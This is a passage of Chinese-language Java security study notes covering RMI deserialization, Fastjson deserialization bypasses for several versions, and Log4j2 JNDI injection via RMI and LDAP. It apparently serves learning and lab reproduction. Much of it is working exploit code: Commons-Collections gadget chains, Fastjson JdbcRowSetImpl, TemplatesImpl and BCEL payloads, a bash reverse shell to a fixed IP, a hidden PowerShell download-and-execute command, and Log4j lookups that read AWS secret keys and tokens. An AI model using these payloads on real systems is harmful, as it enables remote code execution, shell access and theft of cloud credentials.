            System.out.println("创建对象异常");
        } catch (NotBoundException e) {
            System.out.println("对象未绑定");
        }
    }
}
```

### 测试：

接着我们先启动RMIServer类，再启动RMIClient类即可

服务端开启，改写了 Hello() 方法

<img src=".\图片\Snipaste_2023-03-09_18-50-26.png" alt="Snipaste_2023-03-09_18-50-26" style="zoom:80%;" />

客户端开启，拼接字符串成了  `Hellorun......`

<img src=".\图片\Snipaste_2023-03-09_18-51-47.png" alt="Snipaste_2023-03-09_18-51-47" style="zoom:67%;" />

即远程方法调用成功

### P神

上一篇我们详细描述了RMI的通信过程，总结一下，一个RMI过程有以下三个参与者： 

- RMI Registry 
- RMI Server 
- RMI Client 

但是为什么我给的示例代码只有两个部分呢？原因是，通常我们在新建一个RMI Registry的时候，都会 直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：

```
LocateRegistry.createRegistry(1099);
Naming.bind("rmi://127.0.0.1:1099/Hello", new RemoteHelloWorld());
```

第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。 

Naming.bind 的第一个参数是一个URL，形如： rmi://host:port/name 。其中，host和port就是 RMI Registry的地址和端口，name是远程对象的名字。 

如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认 是 1099 ：

```
Naming.bind("Hello", new RemoteHelloWorld());
```

以上就是RMI整个的原理与流程。接下来，我们很自然地想到，RMI会给我们带来哪些安全问题？ 从两个方向思考一下这个问题： 

1. 如果我们能访问RMI Registry服务，如何对其攻击？ 
2. 如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地址），能不能进行攻击？

## RMI机制的利用

因为在整个RMI机制过程中，都是进行**反序列化传输**，我们可以利用这个特性使用RMI机制来对RMI远程服务器进行反序列化攻击。

但实现RMI利用反序列化攻击，需要满足两个条件：

1、接收Object类型参数的远程方法

2、RMI的服务端存在执行pop利用链的jar包

这里我们接着使用上面我们的案例代码进行讲述修改，同时在RMIServer类中commons-collections-3.1.jar包

首先接收Object类型的参数，所以我们将HelloInterface接口定义的hello方法中的参数类型进行改写

<img src=".\图片\Snipaste_2023-03-13_09-47-42.png" alt="Snipaste_2023-03-13_09-47-42" style="zoom:67%;" />

再定义一下Test方法

<img src=".\图片\Snipaste_2023-03-13_09-48-33.png" alt="Snipaste_2023-03-13_09-48-33" style="zoom: 50%;" />

接下来我们的RMI服务端不需要更改，再只需要改下为RMI客户端，其中Test方法中的Object类型参数导入恶意的commons-collections-3.1.jar包pop利用链方法，然后发现成功执行弹出计算器。

```java
package com.zf1yolo;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.net.MalformedURLException;
import java.rmi.*;
import java.util.HashMap;
import java.util.Map;

// 客户端

public class RMIClient {
    public static void main(String[] args){
        try {
            HelloInterface h = (HelloInterface) Naming.lookup("rmi://localhost:1099/hello"); // 寻找RMI实例远程对象
            System.out.println(h.Hello("run......"));
            h.Test(getpayload());
        }catch (MalformedURLException e) {
            System.out.println("url格式异常");
        } catch (RemoteException e) {
            System.out.println("创建对象异常");
        } catch (NotBoundException e) {
            System.out.println("对象未绑定");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getpayload() throws Exception{
        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map =  new HashMap<Object,Object>();
        Map<Object,Object> lazymap= LazyMap.decorate(map,chainedTransformer);
        Class c=  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler)constructor.newInstance(Target.class, lazymap);

        Map  proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},annotationInvocationHandler);
        Object obj = constructor.newInstance(Target.class, proxymap);
        return obj;
    }
}
```

<img src=".\图片\Snipaste_2023-03-13_10-48-05.png" alt="Snipaste_2023-03-13_10-48-05" style="zoom: 50%;" />

## RMI客户端攻击注册中心

在讲这个攻击场景之前，我们可以来看下RMI服务端的触发处。

在RMI过程中，RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会传递给Skeleton代理(sun.rmi.registry.RegistryImpl_Skel#dispatch)

最终实际是sun.rmi.registry.RegistryImpl_Skel#dispatch来进行处理，我们可以定位其查看重要逻辑代码。

<img src=".\图片\Snipaste_2023-03-13_10-56-37.png" alt="Snipaste_2023-03-13_10-56-37" style="zoom: 50%;" />

```java
switch(var3) {
            case 0:
                try { //bind方法
                    var11 = var2.getInputStream();
                    // readObject反序列化触发
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var94) {
                    throw new UnmarshalException("error unmarshalling arguments", var94);
                } catch (ClassNotFoundException var95) {
                    throw new UnmarshalException("error unmarshalling arguments", var95);
                } finally {
                    var2.releaseInputStream();
                }

                var6.bind(var7, var8);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var93) {
                    throw new MarshalException("error marshalling return", var93);
                }
            case 1: //list()方法
                var2.releaseInputStream();
                String[] var97 = var6.list();

                try {
                    ObjectOutput var98 = var2.getResultStream(true);
                    var98.writeObject(var97);
                    break;
                } catch (IOException var92) {
                    throw new MarshalException("error marshalling return", var92);
                }
            case 2:
                try {  // look()方法
                    var10 = var2.getInputStream();
                    // readObject反序列化触发
                    var7 = (String)var10.readObject();
                } catch (IOException var89) {
                    throw new UnmarshalException("error unmarshalling arguments", var89);
                } catch (ClassNotFoundException var90) {
                    throw new UnmarshalException("error unmarshalling arguments", var90);
                } finally {
                    var2.releaseInputStream();
                }

                var8 = var6.lookup(var7);

                try {
                    ObjectOutput var9 = var2.getResultStream(true);
                    var9.writeObject(var8);
                    break;
                } catch (IOException var88) {
                    throw new MarshalException("error marshalling return", var88);
                }
            case 3:
                try { // rebind()方法
                    var11 = var2.getInputStream();
                    //readObject反序列化触发
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var85) {
                    throw new UnmarshalException("error unmarshalling arguments", var85);
                } catch (ClassNotFoundException var86) {
                    throw new UnmarshalException("error unmarshalling arguments", var86);
                } finally {
                    var2.releaseInputStream();
                }

                var6.rebind(var7, var8);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var84) {
                    throw new MarshalException("error marshalling return", var84);
                }
            case 4:
                try { //unbind()方法
                    var10 = var2.getInputStream();
                    //readObject反序列化触发
                    var7 = (String)var10.readObject();
                } catch (IOException var81) {
                    throw new UnmarshalException("error unmarshalling arguments", var81);
                } catch (ClassNotFoundException var82) {
                    throw new UnmarshalException("error unmarshalling arguments", var82);
                } finally {
                    var2.releaseInputStream();
                }

                var6.unbind(var7);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var80) {
                    throw new MarshalException("error marshalling return", var80);
                }
            default:
                throw new UnmarshalException("invalid method number");
            }
```

这里我们可以得知，Registry注册中心能够接收bind/rebind/unbind/look/list/请求，而在接收五类请求方法的时候，只有我们bind，rebind，unbind和look方法进行了反序列化数据调用readObject函数，可能导致直接触发了反序列化漏洞产生。

而我们往下跟踪这五类方法请求，发现也是在RegistryImpl_Stub中进行定义。

<img src=".\图片\20210302102259-34e420f6-7afe-1.png" alt="20210302102259-34e420f6-7afe-1" style="zoom:67%;" />

攻击方法：

RMIRegistryExploit.java的常见使用命令如下：

```
java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit 目标地址 端口号 CommonsCollections1 "calc"
```

# FastJson

## 简单使用

### fastjson序列化

定义一个简单Student类

```java
package org.example.FastJson;
import java.io.IOException;
public class Student {

    private String name;
    private int age;

    public void setAge(int age) {
        this.age = age;
        System.out.println(" method: setAge() ");
    }

    public Student() {
        System.out.println(" method: Student() ");
    }

    public Student(String name , int age) {
        System.out.println(" method: Student(String name , int age) ");
        this.name = name;
        this.age = age;
    }

    public String getName() {
        System.out.println(" method: getName() ");
        return name;
    }

    public int getAge() {
        System.out.println(" method: getAge() ");
        return age;
    }

    public void setName(String name) {
        System.out.println(" method: setName() ");
        this.name = name;
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    public void setAge(int age) {
        System.out.println(" method setAge() ");
        this.age = age;
    }

    @Override
    public String toString() {
        return "Student{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}
```

fastjson 调⽤ `toJSONString` ⽅法将 Student 对象转换成 json 字符串数据的过程中会调⽤对象的 `getter()` ⽅法。

另外 `toJSONString` ⽅法在进⾏序列化时还可以指定⼀个可选的 `SerializerFeature.WriteClassName` 参数，指定了该参数后，在序列化时 json 数据中会写⼊⼀个 `@type` 选项

```
package org.example.FastJson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class Fastjson1 {
    public static void main(String[] args) {
        Student student=  new  Student("nana",20);
        System.out.println( JSON.toJSONString(student));//将对象转成json字符串
        System.out.println( JSON.toJSONString(student, SerializerFeature.WriteClassName));//将对象转成json字符串 @type 类名
    }
}
```

<img src=".\图片\Snipaste_2023-03-13_11-33-18.png" alt="Snipaste_2023-03-13_11-33-18" style="zoom:67%;" />

json数据中的 `@type` 选项**⽤于指定反序列化的类**，也就是说所，当这段json数据被反序列化时，**会按照 @type 选项中指定的类全名反序列化成java对象**

fastjson一些常用反序列化方法:

```java
jpackage org.example.FastJson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Fastjson2 {
    public static void main(String[] args) {
        String json ="{\"@type\":\"org.example.FastJson.Student\",\"age\":30,\"name\":\"nana\"}";
        System.out.println(JSON.parse(json));
        System.out.println( JSON.parseObject(json));
        System.out.println( JSON.parseObject(json,Student.class));
        System.out.println(JSON.parse(json, Feature.SupportNonPublicField));
        System.out.println( JSON.parseObject(json,Student.class,Feature.SupportNonPublicField));
        System.out.println(JSON.parse(json));
    }
}
```

### fastjson反序列化

fastjson 提供了两个反序列化函数：`parseObject` 和 `parse`，我们通过示例程序来看⼀下 fastjson 的反序列 化过程

```java
package org.example.FastJson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;
public class Test1 {
    public static void main(String[] args) {
        Student student = new Student("nana" , 23);
        String jsonString1 = JSON.toJSONString(student);//是将对象转化为Json字符串
        System.out.println("转成json");
        System.out.println(jsonString1);

        System.out.println("转成json @type");
        String jsonString2 = JSON.toJSONString(student,
                SerializerFeature.WriteClassName); //⾃动加⼊ @type
        System.out.println(jsonString2);

        System.out.println("json转对象1");
        JSONObject jsonObject=JSON.parseObject(jsonString2);
        System.out.println(jsonObject);

        System.out.println("json转对象2");
        Student student1=JSON.parseObject(jsonString2,Student.class);
        System.out.println(student1);

        System.out.println("json转对象3");
        Object obj=JSON.parse(jsonString2);
        System.out.println(obj);
    }
}
```

```
method: Student(String name , int age) 
 method: getAge() 
 method: getName() 
转成json
{"age":23,"name":"nana"}
转成json @type
 method: getAge() 
 method: getName() 
{"@type":"org.example.FastJson.Student","age":23,"name":"nana"}
json转对象1
 method: Student() 
 method: setAge() 
 method: setName() 
 method: getAge() 
 method: getName() 
{"name":"nana","age":23}
json转对象2
 method: Student() 
 method: setAge() 
 method: setName() 
Student{name='nana', age=23}
json转对象3
 method: Student() 
 method: setAge() 
 method: setName() 
Student{name='nana', age=23}
```

⽅式⼀：调⽤了 `parseObject` ⽅法将json数据反序列化成java对象，并且在反序列化过程中会调⽤对象的 setter 和 getter ⽅法

⽅式⼆：调⽤了`parseObject`⽅法进⾏反序列化，并且指定了反序列化对象 Student 类，parseObject⽅法 会将json数据反序列化成Student对象，并且在反序列化过程中调⽤了Student对象的setter⽅法

⽅式三：调⽤了`parse`⽅法将json数据反序列化成java对象，并且在反序列化时调⽤了对象的setter⽅法

**关于 Feature.SupportNonPublicField 参数**：

以上这三种⽅式在进⾏反序列化时都会调⽤对象的构造⽅法创建对象，并且还会调⽤对象的setter⽅法， 如果私有属性没有提供 setter ⽅法时，那么还会正确被反序列化成功吗？为了验证这个猜想，现在我们把 Student对象的私有属性name的setter⽅法去掉。 从程序执⾏结果来看，私有属性 name 并没有被正确反序列化，也就是说 **fastjson 默认情况下不会对私有属性进⾏反序列化**

## 反序列化漏洞原理

**我们知道 fastjson 在进⾏反序列化时会调⽤⽬标对象的构造，setter，getter等⽅法，如果这些⽅法内部进⾏了⼀些危险的操作时，那么fastjson在进⾏反序列化时就有可能会触发漏洞**。看如下例子：

```java
package org.example.FastJson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;
import java.io.IOException;

class TestTempletaHello {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
public class Fastjson3 {
    public static void main(String[] args) {
        //创建恶意类的实例并转换成json字符串
        TestTempletaHello testTempletaHello = new TestTempletaHello();
        String jsonString = JSON.toJSONString(testTempletaHello, SerializerFeature.WriteClassName);
        System.out.println(jsonString);
        //将json字符串转换成对象

        Object o = JSON.parse(jsonString);
        System.out.println(o);

//        Object obj = JSON.parse("{\"@type\":\"org.example.FastJson.TestTempletaHello\"}");
//        System.out.println(obj);
    }
}
```

<img src=".\图片\Snipaste_2023-03-13_12-00-18.png" alt="Snipaste_2023-03-13_12-00-18" style="zoom:50%;" />

在这个示例程序中先是构造了⼀个恶意类，然后调⽤`toJSONString`⽅法序列化对象写⼊@type，将 @type指定为⼀个恶意的类TestTempletaHello的类全名，当调⽤parse⽅法对TestTempletaHello类进⾏反序列化时，会调⽤恶意类的构造⽅法创建实例对象，因此恶意类TestTempletaHello中的静态代码块中就会被执⾏

**在JdbcRowSetImpl⾥⾯的 connect()⽅法中 存在InitialContext().lookup函数所以存在jndi注⼊**

## fastjson1.2.24漏洞复现

### dnslog检测是否存在漏洞

可以使⽤dnslog ceye 等dnslog平台进⾏漏洞测试

```java
package org.example.FastJson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class Fastjson4 {
    public static void main(String[] args) {
        String json1="{\"zeo\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"ahtdtr.dnslog.cn\"}}";
        JSONObject jsonObject= JSON.parseObject(json1);
    }
}
```

<img src=".\图片\Snipaste_2023-03-13_12-07-56.png" alt="Snipaste_2023-03-13_12-07-56" style="zoom: 67%;" />

1.2.67版本后payload：

```
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
畸形：
{"@type":"java.net.InetSocketAddress"{"address":,"val":"这⾥是dnslog"}}
```

### Fastjson<1.2.24远程代码执行

CNVD-2017-02833

漏洞详情 fastjson 在解析 json 的过程中，⽀持使⽤autoType来实例化某⼀个具体的类，并调⽤该类的 set/get ⽅法 来访问属性。通过查找代码中相关的⽅法，即可构造出⼀些恶意利⽤链

漏洞版本 fastjson <=1.2.24 

漏洞利⽤：

将编译好的 Exploit 放在服务器上，并开启web服务  ` python -m http.server 8088`

```java
public class Exploit {
    static {
        try{
            String[] commands = {"calc"};
            Process pc=Runtime.getRuntime().exec(commands);
            pc.waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

再开上  `marshalsec-0.0.3-SNAPSHOT-all` 开启 `jndi` 服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
http://127.0.0.1:8088/#Exploit 6666
```

最后在⽬标上执⾏

```java
import com.alibaba.fastjson.JSON;

public class Fastjson5 {
    public static void main(String[] args) {
//        String PoC1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:6666/Exploit\", \"autoCommit\":true}";
        String PoC2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ladp://192.168.0.101:6666/Exploit\", \"autoCommit\":true}";
        JSON.parse(PoC2);
    }
}
```

发现弹出计算器

JdbcRowSetImpl利⽤链POC ：

```
RMI利⽤的JDK版本≤ JDK 6u132、7u122、8u113
LADP利⽤JDK版本≤ 6u211 、7u201、8u191
```

## 1.2.25-1.2.41 绕过

修复改动 

1.⾃从1.2.25 起 autotype 默认为False 

2.增加 checkAutoType ⽅法，在该⽅法中进⾏⿊名单校验，同时增加⽩名单机制Fastjson AutoType说明 

```java
import com.alibaba.fastjson.JSON;
public class Fastjson6 {
    public static void main(String[] args) {
        String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://192.168.2.15:6666/win\", \"autoCommit\":true}";
        JSON.parse(PoC);
    }
}
```

## 1.2.42绕过

1.2.42 

修复改动：明⽂⿊名单改为HASH值, checkcheckAutoType ⽅法添加 L 和 ; 字符过滤

利用：

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
public class POC {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String PoC = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",
\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",
\"autoCommit\":true}";
        JSON.parse(PoC);
   }
}
```

## 1.2.25-1.2.47通杀

为什么说这⾥标注为通杀呢，其实这⾥和前⾯的绕过⽅式不太⼀样，这⾥是可以直接绕过 AutoTypeSupport ，即便关闭 AutoTypeSupport 也能直接执⾏成功

```java
import com.alibaba.fastjson.JSON;
public class FastTestpoc {
        public static void main(String[] args) {
            String PoC = "{\n" +                "    \"a\":{\n" +        
       "        \"@type\":\"java.lang.Class\",\n" +                "    
   \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +                "  
},\n" +                "    \"b\":{\n" +                "      
\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +                "      
\"dataSourceName\":\"ldap://localhost:1389/badNameClass\",\n" +        
       "        \"autoCommit\":true\n" +                "    }\n" +      
         "}";
            System.out.println(PoC);
            JSON.parse(PoC);
       }
}
```

```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
   },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:1389/badNameClass",
        "autoCommit":true
   }
}
```

## fastjson getshell

步骤还是跟之前一样，开启web服务放入我们编译好的恶意代码，开启 jndi 远程服务调用

linux getshell：

```java
import java.lang.Runtime;
import java.lang.Process;

public class Shell {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.0.173/8888 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
        }}}
```

win getshell：

```java
package org.example.FastJson_t;

public class win {
    static {
        try{
            String[] commands = {"cmd.exe","/c","powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.0.173:81/a'))\""};
            Process pc=Runtime.getRuntime().exec(commands);
            pc.waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

## fastjon不出网利用

### 1、TemplatesImpl利用链

这个利⽤链有限制的。由于该字段在fastjson1.2.22版本引⼊，所以只能影响1.2.22-1.2.24 使⽤条件 

1. parseObject(input,Object.class,Feature.SupportNonPublicField) 
2. parse(input,Feature.SupportNonPublicField) 

这⾥解释⼀下payload的构造：

```
@type：当 fastjson 根据 json 数据对 TemplatesImpl 类进⾏反序列化时，会调⽤TemplatesImpl类的 getOutputProperties⽅法触发利⽤链加载 _bytecodes 属性中的TempletaPoc类字节码并实例化，执⾏RCE代码

_bytecodes：前⾯已经介绍过了，主要是承载恶意类TempletaPoc的字节码。

_name：关于_name属性，在调⽤TemplatesImpl利⽤链的过程中，会对_name进⾏不为null的校验，因 此_name的值不能为null（具体可参考CC2利⽤链）

_tfactory：在调⽤TemplatesImpl利⽤链时，defineTransletClasses⽅法内部会通过_tfactory属性调⽤ ⼀个getExternalExtensionsMap⽅法，如果_tfactory属性为null则会抛出异常，⽆法根据_bytecodes属 性的内容加载并实例化恶意类

outputProperties：json数据在反序列化时会调⽤TemplatesImpl类的getOutputProperties⽅法触发利 ⽤链，可以理解为outputProperties属性的作⽤就是为了调⽤getOutputProperties⽅法
```

是的，就是7U21链⾥⾯的 TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 这个类本身就存在反序列化漏洞，会将成员变量 _bytecodes 的数据作为类的字节码进⾏ newInsantce 操作从⽽调⽤其构造⽅法或 static 块。故可以 fastjson 为契机去调⽤此类

但是由于_name 和 _bytecodes 是私有属性，所以需要FASTJSON反序列化接⼝有 Feature.SupportNonPublicField参数才能实现，利⽤条件很苛刻，但是条件允许的话就很⽅便， payload打过去就完事

“_tfactory这个字段在TemplatesImpl既没有get⽅法也没有set⽅法，这没关系，我们设置_tfactory为{ },fastjson会调⽤其⽆参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses() ⽤到会引⽤_tfactory属性导致异常退出。“

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
public class Evil extends AbstractTranslet {
    static {
        try {
            String[] cmd = {"calc"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
       } catch ( Exception e ) {
            e.printStackTrace();
       }
   }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers)
throws TransletException {
   }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator,
SerializationHandler handler) throws TransletException {
   }
}
```

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.util.IOUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
public class FastjsonTemplatesImpl {
    public static void main(String[] args) throws IOException {
        byte[] code =
Files.readAllBytes(Paths.get("D:\\pentest\\javasec\\fastjson\\target\\cla
sses\\Evil.class"));
        String byteCode  = Base64.getEncoder().encodeToString(code);
        final String NASTY_CLASS =
"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String payload = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+byteCode+"\"]," +
                "'_name':'Evil'," +
                "'_tfactory':{}," +
                "\"_outputProperties\":{}}\n";
        System.out.println(payload);
        //反序列化
        Object object = JSON.parseObject(payload,
Feature.SupportNonPublicField);
   }
}
```

### 2、BCEL字节码利用

⽽在tomcat中的 com.sun.org.apache.bcel.internal.util.ClassLoader 的loadclass⽅法中可以进⾏bcel 字节码的加载。

需要添加依赖

```xml
<dependency>
<groupId>org.apache.tomcat</groupId>
<artifactId>tomcat-dbcp</artifactId>
<version>9.0.8</version>
</dependency>
```

编译代码

```java
import java.io.IOException;
public class Test {
    static {
        try {
            Runtime.getRuntime().exec("calc");
       } catch (IOException e) {
            e.printStackTrace();
       }
   }
}
```

利用：

```java
import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Fastjsonbecl {
    public static void main(String[] args) throws IOException {
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\Evil.class"));
        String code = Utility.encode(bytes,true);
        String poc = "{\n" +
                " {\n" +
                " \"aaa\": {\n" +
                " \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                " \"driverClassLoader\": {\n" +
                " \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                " },\n" +
                " \"driverClassName\": \"$$BCEL$$"+ code+ "\"\n" +
                " }\n" +
                " }: \"bbb\"\n" +
                "}";
        System.out.println(poc);
        JSON.parse(poc);
    }
}
```

# Log4j2

## JNDI协议

JNDI基本介绍：

JNDI（Java Naming and Directory Interface–Java命名和⽬录接⼝）是Java中**为命名和⽬录服务提供接⼝的API**，通过名字可知道，JNDI主要由两部分组成：`Naming`（命名）和 `Directory`（⽬录），其中 Naming是指将对象通过唯⼀标识符绑定到⼀个上下⽂Context，同时可通过唯⼀标识符查找获得对象， ⽽Directory主要指将某⼀对象的属性绑定到Directory的上下⽂DirContext中，同时可通过名字获取对象 的属性同时操作属性

JNDI架构图：

JNDI主要由JNDI API和JNDI SPI两部分组成，Java应⽤程序通过JNDI API访问⽬录服务，⽽JNDI API会 调⽤Naming Manager实例化JNDI SPI，然后通过JNDI SPI去操作命名或⽬录服务其如LDAP， DNS， RMI等，JNDI内部已实现了对LDAP，DNS， RMI等⽬录服务器的操作API

<img src=".\图片\Snipaste_2023-03-14_13-43-29.png" alt="Snipaste_2023-03-14_13-43-29" style="zoom:80%;" />

## RMI协议

远程⽅法调⽤，深⼊了解：      https://www.cnblogs.com/nice0e3/p/14280278.html

RMI（Remote Method Invocation）为远程⽅法调⽤，是允许运⾏在⼀个Java虚拟机的对象调⽤运⾏ 在另⼀个Java虚拟机上的对象的⽅法。 这两个虚拟机可以是运⾏在相同计算机上的不同进程中， 也可以是运⾏在⽹络上的不同计算机中，RMI体系结构是基于⼀个⾮常重要的⾏为定义和⾏为实现相 分离的原则。RMI允许定义⾏为的代码和实现⾏为的代码相分离，并且运⾏在不同的JVM上。 不同于socket,RMI中分为三⼤部分：Server、Client、Registry

- Server: 提供远程的对象 
- Client: 调⽤远程的对象 
- Registry: ⼀个注册表，存放着远程对象的位置（ip、端⼝、标识符）

获取敏感信息：

```
${hostName}
${sys:user.name}
${sys:user.home}
${sys:user.dir}
${sys:java.home}
${sys:java.vendor}
${sys:java.version}
${sys:java.vendor.url}
${sys:java.vm.version}
${sys:java.vm.vendor}
${sys:java.vm.name}
${sys:os.name}
${sys:os.arch}
${sys:os.version}
${env:JAVA_VERSION}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:AWS_PROFILE}
${env:AWS_CONFIG_FILE}
${env:AWS_ACCESS_KEY_ID}
```

## JNDI注⼊+RMI实现攻击

### Rmiserver：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Rmiserver {
    public static void main(String[] args) throws Exception {
        //创建一个注册表
        Registry registry = LocateRegistry.createRegistry(6666);
        //引用一个类
        Reference reference = new Reference("Evil", "Evil", "http://192.168.0.101/");
        //封装成远程调用对象
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        //往注册表里面绑定对象
        registry.bind("obj",referenceWrapper);
        System.out.println("server running");
    }
}
```

### 恶意类

必须实现 `ObjectFactory` 接⼝

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Evil implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("calc");
        return null;
    }
}
```

或者在类加载的时候

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
public class EWvilCode {
    static {
        System.out.println("will do this");
        Process p;
        String[] cmd = {"calc"};
        try {
            p = Runtime.getRuntime().exec(cmd);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            while((line=br.readLine())!=null) {
                System.out.println(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

### jdni协议 调用rmi协议加载类

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
public class Rmiclient {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("rmi://127.0.0.1:6666/obj");
    }
}
```

### 结果

先执行 `Rmiserver` 再执行 `Rmiclient` ，Rmiclient 调用到 `http://192.168.0.101/` 中的 `Evil` 恶意类，从而执行计算器

<img src=".\图片\Snipaste_2023-03-14_13-55-31.png" alt="Snipaste_2023-03-14_13-55-31" style="zoom:50%;" />

存在漏洞版本：

<img src=".\图片\Snipaste_2023-03-14_13-56-06.png" alt="Snipaste_2023-03-14_13-56-06" style="zoom: 67%;" />

## LDAP协议

LDAP 是 Lightweight Directory Access Protocol的缩写，顾名思义，它是指**轻量级目录访问协议**。这个协议是⽤于访问⽬录服务的。⽬录服务和数据库很类似，但⼜有着很⼤的不同之处。数据库设计为⽅便 读写，但⽬录服务专⻔进⾏了读优化的设计，因此不太适合于经常有写操作的数据存储

## JNDI+LDAP实现攻击

创建服务LDAP服务：

```java
package com.test;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

